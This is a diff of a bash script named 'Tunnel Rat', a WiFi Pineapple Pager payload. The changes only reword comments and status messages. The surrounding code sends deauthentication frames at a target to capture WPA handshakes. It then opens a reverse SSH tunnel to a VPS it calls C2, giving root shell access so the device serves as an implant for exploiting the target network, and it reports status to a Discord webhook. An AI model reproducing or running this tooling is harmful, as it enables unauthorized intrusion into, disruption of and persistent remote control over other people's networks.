@@ -1,9 +1,9 @@
 #!/bin/bash
 # Tunnel Rat
 # github.com/OSINTI4L
-# Tunnel Rat is a Hak5 Pineapple Pager payload that allows remote access to the pager through a virtual private server reverse SSH tunnel. This allows the pager to be used as an implant device allowing for remote exploitation of the target network. See attached README.md for full documentation and setup.
+# Tunnel Rat is a Hak5 WiFi Pineapple Pager payload that allows remote access to the pager through a virtual private server reverse SSH tunnel. This allows the pager to be used as an implant device allowing for remote exploitation of the target network. See attached README.md for full documentation and setup.
 # Dependencies: sshpass | VPS | Discord webhook
-# Built on Pineapple Pager firmware v1.0.6
+# Built on WiFi Pineapple Pager firmware v1.0.6
 
 MAPSSID="Name-Management-Portal-SSID-Here"
 MAPPASS="Enter-Management-Portal-Password-Here"
@@ -46,7 +46,7 @@ DEAUTHTARG() {
     _pineap DEAUTH "$TARGETMAC" "FF:FF:FF:FF:FF:FF" "$TARGETCH"
 }
  
- # If PCAP configure filename/spawn MGMT AP, else deauth/sleep 1 minutes and check again, loop until PCAP:
+ # If PCAP configure filename/spawn MGMT AP, else deauth/sleep 1 minute and check again, loop until PCAP:
 if [ -n "$PCAP" ]; then
     LOG green "Handshake found!"
     sleep 1.5
@@ -112,7 +112,7 @@ else
     exit 0
 fi
 
-# Check and establish SSH tunnel to VPS C2:
+# Check and establish reverse SSH tunnel to VPS C2:
 PINGVPS() {
     ping -c1 "$VPSIP"
 }
@@ -141,17 +141,17 @@ TUNNELCHECK() {
 }
 if TUNNELCHECK; then
     sleep 1
-    LOG green "SSH tunnel successfully established!"
+    LOG green "Reverse SSH tunnel successfully established!"
     curl -H "Content-Type: application/json" \
     -X POST \
-    -d "{\"content\": \"SSH tunnel successfully established! Access pager shell at VPS C2: ssh -p 2222 root@127.0.0.1\"}" \
+    -d "{\"content\": \"Reverse SSH tunnel successfully established! Access pager root shell at VPS C2: ssh -p 2222 root@127.0.0.1\"}" \
     "$DISCORD_WEBHOOK"
 else
     ALERT "VPS tunnel could not be established!"
     LOG red "Exiting."
         curl -H "Content-Type: application/json" \
         -X POST \
-        -d "{\"content\": \"SSH tunnel could not be established! Exiting.\"}" \
+        -d "{\"content\": \"Reverse SSH tunnel could not be established! Exiting.\"}" \
         "$DISCORD_WEBHOOK"
     exit 0
 fi
